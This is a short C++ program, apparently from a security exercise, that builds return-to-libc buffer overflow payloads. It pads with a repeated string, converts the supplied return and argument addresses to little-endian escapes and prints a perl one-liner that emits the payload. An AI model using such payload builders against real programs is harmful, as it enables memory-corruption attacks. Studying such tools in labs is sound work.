#include <iostream>
#include <string>
#include <cstdlib>

using namespace std;

string getLittleEndian(const string &addr);
bool isAddress(const string &addr);

int main(int argc, char *argv[]) {
/*	if(argc != 6) {
		cout << "need arguments in the following format" <<endl;
		cout << "<string> <timesToRepeat> <retAdr> <retRetAdr> <ArgAddr>" << endl;
		return 0;
	}*/
	
	string str = argv[1];
	string rep = argv[2];
	string ret = getLittleEndian(argv[3]);;
	string retRet;
	if(isAddress(argv[4])) retRet = getLittleEndian(argv[4]);
	else {
		for(int i = 0; i < 4; ++i) {
			retRet += argv[4];
		}
	}
	string argAdr = getLittleEndian(argv[5]);
	
/*	cout << str << endl;
	cout << rep << endl;
	cout << ret << endl;
	cout << retRet << endl;
	cout << argAdr << endl; */
	
	string perlScript;
	perlScript = "`perl -e \'print \"" + str + "\"x" + rep + " . \"" + ret + retRet + argAdr + "\"'`";
	cout << perlScript << endl;
	
//	cout << str << ret << retRet << argAdr;
	return 0;
}

bool isAddress(const string &addr) {
	return (addr[0] == '0' && addr[1] == 'x');
}

string getLittleEndian(const string &addr){
	if(addr.size() != 10) {
		cout << "improper address " << addr << " : size = " << addr.size() << endl;
		return 0;
	}
	
	string opAddr;
	
	opAddr += "\\x";
	opAddr += addr[8];
	opAddr += addr[9];	
	
	opAddr += "\\x";
	opAddr += addr[6];
	opAddr += addr[7];
	
	opAddr += "\\x";
	opAddr += addr[4];
	opAddr += addr[5];
	
	opAddr += "\\x";
	opAddr += addr[2];
	opAddr += addr[3];
	
	return opAddr;
}
